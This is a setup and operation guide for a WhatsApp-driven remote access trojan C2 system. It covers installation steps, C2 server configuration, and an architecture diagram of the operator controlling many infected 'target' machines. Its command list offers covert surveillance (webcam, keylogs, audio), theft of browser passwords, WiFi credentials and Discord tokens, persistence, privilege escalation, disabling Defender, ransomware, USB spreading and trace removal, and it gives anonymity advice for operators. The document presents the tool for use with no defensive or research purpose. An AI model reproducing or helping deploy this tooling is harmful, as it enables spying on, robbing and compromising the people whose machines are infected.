# T0OL-B4S3-263 Setup Guide

A comprehensive guide to setup and deploy the T0OL-B4S3-263 WhatsApp RAT control system.

---

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [Quick Start](#quick-start)
3. [Configuration](#configuration)
4. [Running the Bot](#running-the-bot)
5. [Troubleshooting](#troubleshooting)
6. [Advanced Setup](#advanced-setup)

---

## Prerequisites

### System Requirements

- **Node.js**: v18.0.0 or higher
- **npm**: v9.0.0 or higher
- **Python**: v3.8+ (for RAT server - optional)
- **OS**: Linux, macOS, or Windows

### Required Accounts

- **WhatsApp Account**: Phone number with WhatsApp installed
- **Auth Device**: Secondary phone to scan QR code

### Network Requirements

- Stable internet connection
- Access to port 4444 (for C2 server)
- Access to port 5000 (for API bridge - optional)

---

## Quick Start

### 1. Clone Repository

```bash
git clone https://github.com/ksm-zw/Claude-Shell-2.git
cd Claude-Shell-2/whatsapp-c2
```

### 2. Install Dependencies

```bash
npm install
```

### 3. Run Setup Wizard

```bash
node setup.js
```

The setup wizard will guide you through configuration:

- **RAT Server**: Host and port of your C2 server
- **Encryption Key**: For secure communication (auto-generated if needed)
- **WhatsApp Setup**: Bot name and owner phone numbers
- **Features**: Enable/disable optional features

### 4. Start the Bot

```bash
npm start
```

### 5. Authenticate

1. A QR code will appear in terminal
2. Open WhatsApp on your authorized phone
3. Scan the QR code
4. Bot will connect and be ready for commands

### 6. Test the Bot

Send your first command:

```
/help
```

Bot will respond with command menu.

---

## Configuration

### Configuration Files

After running `setup.js`, two files are created:

#### `config.json` (Machine-readable)

```json
{
  "ratServer": {
    "host": "127.0.0.1",
    "port": 4444,
    "encryptionKey": "your-encryption-key-here",
    "apiPort": 5000
  },
  "whatsapp": {
    "botName": "T0OL-B4S3-263 C2",
    "prefix": "/",
    "ownerNumbers": ["1234567890@s.whatsapp.net"]
  },
  "features": {
    "autoSaveMedia": true,
    "maxCommandTimeout": 60000,
    "enableNotifications": true
  }
}
```

#### `.env` (Environment variables)

```bash
RAT_SERVER_HOST=127.0.0.1
RAT_SERVER_PORT=4444
ENCRYPTION_KEY=your-key-here
BOT_NAME="T0OL-B4S3-263 C2"
COMMAND_PREFIX="/"
OWNER_NUMBERS=["1234567890@s.whatsapp.net"]
```

### Configuration Options

| Option | Description | Default |
|--------|-------------|---------|
| `ratServer.host` | C2 server address | 127.0.0.1 |
| `ratServer.port` | C2 server port | 4444 |
| `encryptionKey` | Fernet encryption key | Auto-generated |
| `whatsapp.prefix` | Command prefix | `/` |
| `autoSaveMedia` | Save screenshots, audio, etc | true |
| `maxCommandTimeout` | Default timeout in ms | 60000 |
| `enableNotifications` | Send completion messages | true |

### Manual Configuration

If you want to manually edit configuration:

1. Open `config.json` in text editor
2. Modify desired fields
3. Save file
4. Restart bot: `npm start`

### Encryption Key Management

The encryption key is critical for secure communication.

**Generate a new key:**

```bash
node -e "console.log(require('crypto').randomBytes(32).toString('base64').substring(0, 44))"
```

**Store safely:**

- Keep `.env` file secret
- Don't commit to Git repository
- Use `.env.example` as template only

---

## Running the Bot

### Start in Production

```bash
npm start
```

The bot will:
1. Load configuration from `config.json`
2. Initialize WhatsApp connection
3. Connect to RAT C2 server
4. Show QR code for authentication
5. Wait for commands

### Start in Development

```bash
npm run dev
```

Auto-restarts on file changes (useful for development).

### Session Storage

WhatsApp sessions are stored in: `whatsapp-c2/sessions/`

These files contain authentication credentials. Keep secure:

```bash
chmod 700 sessions/
```

### Logs

Check bot logs for troubleshooting:

```bash
# View recent logs
tail -f logs/bot.log

# View errors only
grep ERROR logs/bot.log
```

---

## Command System

### Available Commands

#### Help & Information

```
/help                 - Show main help menu
/help -category       - Show commands in category
/help -command        - Detailed help for command
/menu                 - Show command categories
/ping                 - Check bot status
/sessions             - List active sessions
/use <id>             - Switch to session
```

#### Surveillance (📸)

```
/screenshot           - Capture screen
/webcam              - Capture webcam
/keylogs             - Get keystroke logs
/record <seconds>    - Record audio
/clipboard           - Get clipboard content
```

#### Credentials (🔐)

```
/passwords           - Extract browser passwords
/wifi                - Get WiFi credentials
/discord             - Steal Discord tokens
/history <browser>   - Browser history
```

#### System (⚙️)

```
/sysinfo             - System information
/processes           - Running processes
/metrics             - Performance metrics
/software            - Installed programs
/netscan             - Network scan
/locate              - Geolocation
```

#### Advanced (🎮)

```
/msgbox <text>       - Show message box
/beep [freq] [dur]   - Play system sound
/lock                - Lock screen
/shutdown            - Shutdown system
/persist             - Install persistence
/elevate             - Privilege escalation
/defenderoff         - Disable Defender
/ransom <path>       - Ransomware simulation
/spread              - USB spreading
/selfdestruct        - Remove traces
```

### Command Format

Commands follow this pattern:

```
/command [arguments]
```

Examples:

```
/screenshot                    # No arguments
/record 10                     # With duration
/history chrome                # With browser name
/help -screenshot              # Get help for command
```

---

## Troubleshooting

### Bot Won't Start

**Error: Cannot find config.json**

```bash
# Run setup wizard
node setup.js

# Or manually create config.json
cp .env.example config.json
```

**Error: Module not found**

```bash
# Reinstall dependencies
rm -rf node_modules
npm install
```

### Connection Issues

**RAT Server unreachable**

- Verify server is running on configured host/port
- Check firewall rules
- Verify encryption key matches server config

**WhatsApp QR code not appearing**

```bash
# Clear sessions and retry
rm -rf sessions/*
npm start
```

### Commands Not Working

**No active session**

```
/sessions              # List available sessions
/use <id>              # Switch to a session
```

**Command timeout**

Increase `maxCommandTimeout` in config.json:

```json
"features": {
  "maxCommandTimeout": 120000
}
```

**Unauthorized access**

Add your WhatsApp number to `config.json`:

```json
"ownerNumbers": ["yourphonenumber@s.whatsapp.net"]
```

---

## Advanced Setup

### Using Environment Variables

Instead of config.json, use .env:

```bash
# Create .env file
cp .env.example .env

# Edit .env with your values
nano .env

# Bot automatically loads from .env
npm start
```

### Running Behind Proxy

Edit bot.js to add proxy configuration:

```javascript
const proxyAgent = new HttpProxyAgent(process.env.HTTP_PROXY);
const httpsProxyAgent = new HttpsProxyAgent(process.env.HTTPS_PROXY);
```

### Custom Session Storage

Change session directory in config:

```json
"features": {
  "sessionDir": "/custom/path/sessions"
}
```

### Webhook Integration

Set webhook URL for notifications:

```json
"features": {
  "webhookUrl": "https://your-server.com/webhook"
}
```

### Database Logging

Store command logs in database:

```json
"features": {
  "database": "mongodb://localhost:27017/rat-logs"
}
```

---

## Security Recommendations

### Before Deployment

1. **Change default encryption key** in setup wizard
2. **Use strong, unique owner numbers** - verify WhatsApp contacts
3. **Enable VPN/Proxy** for anonymity
4. **Use private network** isolated from public internet
5. **Rotate credentials regularly** - new encryption keys every month

### During Operation

1. **Monitor logs** for unauthorized access attempts
2. **Limit owner numbers** to essential personnel only
3. **Use HTTPS** when possible (implement SSL termination)
4. **Keep dependencies updated**: `npm audit` regularly
5. **Secure session storage**: `chmod 700 sessions/`

### Environment Isolation

```bash
# Use separate user for bot
sudo useradd -m -s /bin/bash ratbot
sudo su - ratbot

# Run bot with restricted permissions
npm start
```

---

## Architecture Overview

```
┌─────────────────────────────────────────┐
│     WhatsApp Bot (Node.js)              │
│     whatsapp-c2/bot.js                  │
└────────────────┬────────────────────────┘
                 │
         ┌───────▼────────┐
         │  RATClient     │
         │  (TCP Socket)  │
         └───────┬────────┘
                 │ Encrypted (Fernet)
                 │
┌────────────────▼────────────────────────┐
│     C2 Server (Python)                  │
│     rat_server_fixed.py:4444            │
└────────────────┬────────────────────────┘
                 │
    ┌────────────┼────────────┐
    │            │            │
 [Target1]   [Target2]    [TargetN]
  RAT Client  RAT Client   RAT Client
```

---

## Performance Tuning

### For High Session Count

```json
"features": {
  "maxConcurrentCommands": 10,
  "commandQueueSize": 50,
  "sessionPoolSize": 20
}
```

### For Low Bandwidth

```json
"features": {
  "autoSaveMedia": false,
  "compressResponses": true,
  "chunkSize": 4096
}
```

### For Real-time Operations

```json
"features": {
  "maxCommandTimeout": 30000,
  "connectionPoolSize": 50,
  "enableKeepAlive": true
}
```

---

## Getting Help

### Command Help

```bash
/help                 # Main menu
/help -surveillance   # Surveillance category
/help -screenshot     # Detailed screenshot help
```

### Documentation

- README.md - Project overview
- CONFIG_REFERENCE.md - Configuration details
- SETUP_GUIDE.md - This file

### Troubleshooting

Check `logs/` directory for error messages and diagnostic information.

---

**Last Updated**: December 8, 2025  
**Version**: 1.0.0  
**Status**: Production Ready

---
